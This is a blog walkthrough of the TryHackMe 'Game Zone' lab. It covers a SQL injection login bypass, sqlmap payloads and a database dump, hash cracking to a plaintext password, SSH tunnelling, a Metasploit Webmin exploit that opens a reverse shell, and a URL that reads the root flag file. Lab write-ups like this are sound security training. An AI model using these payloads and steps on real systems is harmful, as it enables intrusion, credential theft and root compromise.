---
layout: post
title:  "Tryhackme Walkthough - Game Zone"
date:   2021-02-21 09:16:14 -0800
categories: tryhackme
---
This is a walkthrough of the Tryhackme room called "Game Zone".
 
Ths description of this room states

>This room will cover SQLi (exploiting this vulnerability manually and via SQLMap), cracking a users hashed password, using SSH tunnels to reveal a hidden service and using a metasploit payload to gain root privileges. 

This THM room doesn't ask to run NMap scans or any of the initial enumeration so we will start by going directly to the site. 

## The Game Zone Website

Navigating to the site in a browser, we see a website called Game Zone. 

![](/assets/img/2021-02-21_9-13-48.jpg)

There is a User Login panel on the left side so this looks like a good place to attack so we try to login as admin.

```
SELECT * FROM users WHERE username = admin AND password := ' or 1=1 -- -
```
The room says that the site doesn't have any user called admin but the above query works and brings you to a portal page at portal.php.

![](/assets/img/2021-02-21_9-23-43.jpg)

## Using SQLMap

The next thing to do is to dump the SQL database using SQLMap. 

The room directs you to intercept a search request using BurpSuite which is what I did and got back the following.

```
POST /portal.php HTTP/1.1
Host: 10.10.108.67
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 17
Origin: http://10.10.108.67
Connection: close
Referer: http://10.10.108.67/portal.php
Cookie: PHPSESSID=suepevsj6e11r9tko2ggj5q8q5
Upgrade-Insecure-Requests: 1

searchitem=testing
```

This was then saved to a file called sqlrequest.txt.

By the way, it is also possible to view the request using the developer tools in Firefox from the Network tab. 

After capturing the request, we then feed this into SQLmap

```
sqlmap -r sqlrequest.txt -dbms mysql -dump
```
where 

-r : use the intercepted request

-dbms : what database we are dealing with

-dump : dump the entire database.

This yields the following

```
(dspo6㉿kali)[~/pentest/boxes/thm/game_zone]$ sqlmap -r sqlrequest.txt -dbms mysql -dump
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.5#stable}
|_ -| . ["]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 10:49:55 /2021-02-19/

[10:49:55] [INFO] parsing HTTP request from 'sqlrequest.txt'
[10:49:55] [INFO] testing connection to the target URL
[10:49:55] [INFO] testing if the target URL content is stable
[10:49:55] [INFO] target URL content is stable
[10:49:55] [INFO] testing if POST parameter 'searchitem' is dynamic
[10:49:56] [WARNING] POST parameter 'searchitem' does not appear to be dynamic
[10:49:56] [INFO] heuristic (basic) test shows that POST parameter 'searchitem' might be injectable (possible DBMS: 'MySQL')
[10:49:56] [INFO] heuristic (XSS) test shows that POST parameter 'searchitem' might be vulnerable to cross-site scripting (XSS) attacks
[10:49:56] [INFO] testing for SQL injection on POST parameter 'searchitem'
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] 
[10:50:02] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[10:50:02] [WARNING] reflective value(s) found and filtering out
[10:50:04] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[10:50:04] [INFO] testing 'Generic inline queries'
[10:50:04] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[10:50:14] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[10:50:16] [INFO] POST parameter 'searchitem' appears to be 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)' injectable (with --string="be")
[10:50:16] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[10:50:16] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[10:50:16] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[10:50:17] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[10:50:17] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
[10:50:17] [INFO] POST parameter 'searchitem' is 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)' injectable 
[10:50:17] [INFO] testing 'MySQL inline queries'
[10:50:17] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[10:50:18] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[10:50:18] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[10:50:18] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
[10:50:19] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query - comment)'
[10:50:19] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query)'
[10:50:19] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[10:50:30] [INFO] POST parameter 'searchitem' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
[10:50:30] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[10:50:30] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'
[10:50:30] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[10:50:30] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[10:50:31] [INFO] target URL appears to have 3 columns in query
[10:50:32] [INFO] POST parameter 'searchitem' is 'MySQL UNION query (NULL) - 1 to 20 columns' injectable
[10:50:32] [WARNING] in OR boolean-based injection cases, please consider usage of switch '--drop-set-cookie' if you experience any problems during data retrieval
POST parameter 'searchitem' is vulnerable. Do you want to keep testing the others (if any)? [y/N] y
sqlmap identified the following injection point(s) with a total of 88 HTTP(s) requests:
---
Parameter: searchitem (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)
    Payload: searchitem=-2828' OR 2751=2751#

    Type: error-based
    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
    Payload: searchitem=tester' AND GTID_SUBSET(CONCAT(0x7171627071,(SELECT (ELT(4754=4754,1))),0x717a627071),4754)-- bmCD

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: searchitem=tester' AND (SELECT 6499 FROM (SELECT(SLEEP(5)))RNqx)-- KlSE

    Type: UNION query
    Title: MySQL UNION query (NULL) - 3 columns
    Payload: searchitem=tester' UNION ALL SELECT NULL,NULL,CONCAT(0x7171627071,0x724f745778686f5371736d525645714c44466567514b48564d4f4a775564714875434e5956455964,0x717a627071)#
---
[10:51:33] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.6
[10:51:34] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries
[10:51:34] [INFO] fetching current database
[10:51:35] [INFO] fetching tables for database: 'db'
[10:51:35] [INFO] fetching columns for table 'users' in database 'db'
[10:51:35] [INFO] fetching entries for table 'users' in database 'db'
[10:51:35] [INFO] recognized possible password hashes in column 'pwd'
do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] y
[10:51:44] [INFO] writing hashes to a temporary file '/tmp/sqlmapg3savr7s11905/sqlmaphashes-g6au1jcb.txt' 
do you want to crack them via a dictionary-based attack? [Y/n/q] 
[10:51:49] [INFO] using hash method 'sha256_generic_passwd'
what dictionary do you want to use?
[1] default dictionary file '/usr/share/sqlmap/data/txt/wordlist.tx_' (press Enter)
[2] custom dictionary file
[3] file with list of dictionary files
> 
[10:51:56] [INFO] using default dictionary
do you want to use common password suffixes? (slow!) [y/N] 
[10:52:01] [INFO] starting dictionary-based cracking (sha256_generic_passwd)
[10:52:01] [INFO] starting 4 processes 
[10:52:10] [WARNING] no clear password(s) found                                                                                                           
Database: db
Table: users
[1 entry]
+------------------------------------------------------------------+----------+
| pwd                                                              | username |
+------------------------------------------------------------------+----------+
| ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14 | agent47  |
+------------------------------------------------------------------+----------+

[10:52:10] [INFO] table 'db.users' dumped to CSV file '/home/dspo6/.local/share/sqlmap/output/10.10.108.67/dump/db/users.csv'
[10:52:10] [INFO] fetching columns for table 'post' in database 'db'
[10:52:10] [INFO] fetching entries for table 'post' in database 'db'
Database: db
Table: post
[5 entries]
+----+--------------------------------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
| id | name                           | description                                                                                                                                                                                            |
+----+--------------------------------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
| 1  | Mortal Kombat 11               | Its a rare fighting game that hits just about every note as strongly as Mortal Kombat 11 does. Everything from its methodical and deep combat.                                                         |
| 2  | Marvel Ultimate Alliance 3     | Switch owners will find plenty of content to chew through, particularly with friends, and while it may be the gaming equivalent to a Hulk Smash, that isnt to say that it isnt a rollicking good time. |
| 3  | SWBF2 2005                     | Best game ever                                                                                                                                                                                         |
| 4  | Hitman 2                       | Hitman 2 doesnt add much of note to the structure of its predecessor and thus feels more like Hitman 1.5 than a full-blown sequel. But thats not a bad thing.                                          |
| 5  | Call of Duty: Modern Warfare 2 | When you look at the total package, Call of Duty: Modern Warfare 2 is hands-down one of the best first-person shooters out there, and a truly amazing offering across any system.                      |
+----+--------------------------------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+

[10:52:10] [INFO] table 'db.post' dumped to CSV file '/home/dspo6/.local/share/sqlmap/output/10.10.108.67/dump/db/post.csv'
[10:52:10] [INFO] fetched data logged to text files under '/home/dspo6/.local/share/sqlmap/output/10.10.108.67'

[*] ending @ 10:52:10 /2021-02-19/

(dspo6㉿kali)[~/pentest/boxes/thm/game_zone]$ 
```



```
b 19 10:52 ..
-rw-r--r-- 1 dspo6 dspo6  823 Feb 19 10:52 post.csv
-rw-r--r-- 1 dspo6 dspo6   87 Feb 19 10:52 users.csv
(dspo6㉿kali)[~/.local/share/sqlmap/output/10.10.108.67/dump/db]$ cat users.csv 
pwd,username
ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14,agent47

(dspo6㉿kali)[~/.local/share/sqlmap/output/10.10.108.67/dump/db]$ 

```
Of interest to us here is this section which shows us the users table along with the password hash.

```
Database: db
Table: users
[1 entry]
+------------------------------------------------------------------+----------+
| pwd                                                              | username |
+------------------------------------------------------------------+----------+
| ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14 | agent47  |
+------------------------------------------------------------------+----------+

```

## Hashcat

I switched over to my Windows PC to crack this hash so I could take advantage of the GPU using the rockyou word list (although the output indicates that I need to update the CUDA SDK on my PC).


```
PS D:\Google Drive\Cyber Security\Utils\hashcat-6.1.1> .\hashcat.exe -a 0 -m 1400 .\target\hash.txt ..\wordlists\rockyouhashcat (v6.1.1) starting...

* Device #1: CUDA SDK Toolkit installation NOT detected.
             CUDA SDK Toolkit installation required for proper device support and utilization
             Falling back to OpenCL Runtime

* Device #1: WARNING! Kernel exec timeout is not disabled.
             This may cause "CL_OUT_OF_RESOURCES" or related errors.
             To disable the timeout, see: https://hashcat.net/q/timeoutpatch
OpenCL API (OpenCL 1.2 CUDA 11.2.109) - Platform #1 [NVIDIA Corporation]
========================================================================
* Device #1: GeForce GTX 1070, 6720/8192 MB (2048 MB allocatable), 15MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Applicable optimizers applied:
* Zero-Byte
* Early-Skip
* Not-Salted
* Not-Iterated
* Single-Hash
* Single-Salt
* Raw-Hash

ATTENTION! Pure (unoptimized) backend kernels selected.
Using pure kernels enables cracking longer passwords but for the price of drastically reduced performance.
If you want to switch to optimized backend kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 327 MB

Dictionary cache hit:
* Filename..: ..\wordlists\rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14:videogamer124

Session..........: hashcat
Status...........: Cracked
Hash.Name........: SHA2-256
Hash.Target......: ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218...3efd14
Time.Started.....: Fri Feb 19 08:31:10 2021 (1 sec)
Time.Estimated...: Fri Feb 19 08:31:11 2021 (0 secs)
Guess.Base.......: File (..\wordlists\rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........: 21318.5 kH/s (5.41ms) @ Accel:1024 Loops:1 Thr:64 Vec:1
Recovered........: 1/1 (100.00%) Digests
Progress.........: 2949120/14344385 (20.56%)
Rejected.........: 0/2949120 (0.00%)
Restore.Point....: 1966080/14344385 (13.71%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: bragg426 -> vaireva
Hardware.Mon.#1..: Temp: 35c Fan:  0% Util:  5% Core:1759MHz Mem:3802MHz Bus:16

Started: Fri Feb 19 08:31:08 2021
Stopped: Fri Feb 19 08:31:11 2021
PS D:\Google Drive\Cyber Security\Utils\hashcat-6.1.1>
```

So this shows that the password is `videogamer124`


## Using Found Credentials with SSH

We will now try the found credentials to log in using SSH and they work.

```
(dspo6㉿kali)[~/pentest/boxes/thm/game_zone]$ ssh agent47@10.10.108.67
The authenticity of host '10.10.108.67 (10.10.108.67)' can't be established.
ECDSA key fingerprint is SHA256:mpNHvzp9GPoOcwmWV/TMXiGwcqLIsVXDp5DvW26MFi8.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.108.67' (ECDSA) to the list of known hosts.
agent47@10.10.108.67's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-159-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

109 packages can be updated.
68 updates are security updates.


Last login: Fri Aug 16 17:52:04 2019 from 192.168.1.147
agent47@gamezone:~$ 
```

Using the `ss` command to dump socket statistics, we see the following:-

```
agent47@gamezone:~$ ss -tulpn
Netid State      Recv-Q Send-Q                              Local Address:Port                                             Peer Address:Port              
udp   UNCONN     0      0                                               *:10000                                                       *:*                  
udp   UNCONN     0      0                                               *:68                                                          *:*                  
tcp   LISTEN     0      128                                             *:22                                                          *:*                  
tcp   LISTEN     0      80                                      127.0.0.1:3306                                                        *:*                  
tcp   LISTEN     0      128                                             *:10000                                                       *:*                  
tcp   LISTEN     0      128                                            :::22                                                         :::*                  
tcp   LISTEN     0      128                                            :::80                                                         :::*                  
agent47@gamezone:~$ 
```

Note that there is a TCP port 10000 open. 

One thing that I do not understand about this room is the following statement:-

> We can see that a service running on port 10000 is blocked via a firewall rule from the outside (we can see this from the IPtable list). 

I was unable to run the iptables command when logged in as agent47, presumably because that user is not root. In any case we will continue and exploit this port using an SSH tunnel. 

## SSH Tunnel

Creating an SSH tunnel, will allow us to forward traffic on the port 10000 to a port on our PC. 

```
(dspo6㉿kali)[~]$ ssh -L 10000:localhost:10000 agent47@10.10.27.3
The authenticity of host '10.10.27.3 (10.10.27.3)' can't be established.
ECDSA key fingerprint is SHA256:mpNHvzp9GPoOcwmWV/TMXiGwcqLIsVXDp5DvW26MFi8.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.27.3' (ECDSA) to the list of known hosts.
agent47@10.10.27.3's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-159-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

109 packages can be updated.
68 updates are security updates.


Last login: Sat Feb 20 16:57:39 2021 from 10.2.2.175
agent47@gamezone:~$ 

```
Now when we go to our browser and navigate to the site with port 10000 we see a login page.

![](/assets/img/2021-02-22_6-20-43.jpg)

**Note:** The first few times, I tried this I was not able to view this page. It turned out that I still have the proxy for Burpsuite enabled in the browser - lesson learned. 


Logging in with the credentials we found earlier, we are brought to a Webmin version 1.580 page.

![](/assets/2021-02-22_6-28-11.jpg)

## Escalation

Search the Exploit DB, we find [CVE-2012-2982](https://www.exploit-db.com/exploits/21851) which turns out to be a Metasploit exploit. 

**Note:** During this phase, we need to leaave the tunnel open. 

Firing up Metasploit, we can search for "CVE-2012-2982" and then use the resulting exploit. We then need to choose the payload of `cmd/unix/reverse` and enter the options. 


```
msf6 exploit(unix/webapp/webmin_show_cgi_exec) > show options

Module options (exploit/unix/webapp/webmin_show_cgi_exec):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   PASSWORD  videogamer124    yes       Webmin Password
   Proxies                    no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS    localhost        yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT     10000            yes       The target port (TCP)
   SSL       true             yes       Use SSL
   USERNAME  agent47          yes       Webmin Username
   VHOST                      no        HTTP server virtual host


Payload options (cmd/unix/reverse):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.2.2.175       yes       The listen address (an interface may be specified)
   LPORT  9002             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Webmin 1.580


msf6 exploit(unix/webapp/webmin_show_cgi_exec) > 

```

The first time I ran this, the exploit failed

```
msf6 exploit(unix/webapp/webmin_show_cgi_exec) > run
[*] Exploiting target 0.0.0.1

[*] Started reverse TCP double handler on 10.2.2.175:9002 
[*] Attempting to login...
[-] Authentication failed
[*] Exploiting target 127.0.0.1
[*] Started reverse TCP double handler on 10.2.2.175:9002 
[*] Attempting to login...
[-] Exploit failed [unreachable]: OpenSSL::SSL::SSLError SSL_connect returned=1 errno=0 state=error: wrong version number
[*] Exploit completed, but no session was created.
msf6 exploit(unix/webapp/webmin_show_cgi_exec) > 
```

The reason for this is that I had the SSL option set to `true`. I set this to `false` and tried again.

```
msf6 exploit(unix/webapp/webmin_show_cgi_exec) > show options

Module options (exploit/unix/webapp/webmin_show_cgi_exec):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   PASSWORD  videogamer124    yes       Webmin Password
   Proxies                    no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS    localhost        yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT     10000            yes       The target port (TCP)
   SSL       false            yes       Use SSL
   USERNAME  agent47          yes       Webmin Username
   VHOST                      no        HTTP server virtual host


Payload options (cmd/unix/reverse):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.2.2.175       yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Webmin 1.580


msf6 exploit(unix/webapp/webmin_show_cgi_exec) > run
[*] Exploiting target 0.0.0.1

[*] Started reverse TCP double handler on 10.2.2.175:4444 
[*] Attempting to login...
[-] Authentication failed
[*] Exploiting target 127.0.0.1
[*] Started reverse TCP double handler on 10.2.2.175:4444 
[*] Attempting to login...
[+] Authentication successfully
[+] Authentication successfully
[*] Attempting to execute the payload...
[+] Payload executed successfully
[*] Accepted the first client connection...
[*] Accepted the second client connection...
[*] Command: echo NQHi2CZk6m646Ep7;
[*] Writing to socket A
[*] Writing to socket B
[*] Reading from sockets...
[*] Reading from socket A
[*] A: "NQHi2CZk6m646Ep7\r\n"
[*] Matching...
[*] B is input...
[*] Command shell session 1 opened (10.2.2.175:4444 -> 10.10.27.3:41238) at 2021-02-20 18:49:06 -0500
[*] Session 1 created in the background.
msf6 exploit(unix/webapp/webmin_show_cgi_exec) > 
```

We now have a shell and can naviagate to the flag.

```
msf6 exploit(unix/webapp/webmin_show_cgi_exec) > sessions

Active sessions
===============

  Id  Name  Type            Information  Connection
  --  ----  ----            -----------  ----------
  1         shell cmd/unix               10.2.2.175:4444 -> 10.10.27.3:41238 (127.0.0.1)

msf6 exploit(unix/webapp/webmin_show_cgi_exec) > sessions -i 1
[*] Starting interaction with 1...


pwd
/usr/share/webmin/file/
cd /root
ls
root.txt
cat root.txt
a4b945830xxxxxxxxxxxxxxxxxxxxxx
```

### Alternate Escalation Method

When I originally couldn't get the Metapsploit exploit to work because of the wrong SSL setting, I did a bit of Googling and found some information on using the method mentioned in the Expoit DB entry. 

> The vulnerability exists in the /file/show.cgi component and allows an authenticated user, with access to the File Manager Module, 
> to execute arbitrary commands with root privileges.

I discovered that navigating to `http://127.0.0.1:10000/file/show.cgi/root/root.txt` would also display the flag. 


## Conclusion

This was an intersting room to try. I had never used the SSH tunnel method before. 

I do wish that there was more explanation on how the decision was made to use an SSH tunnel to bypass the firewall. 


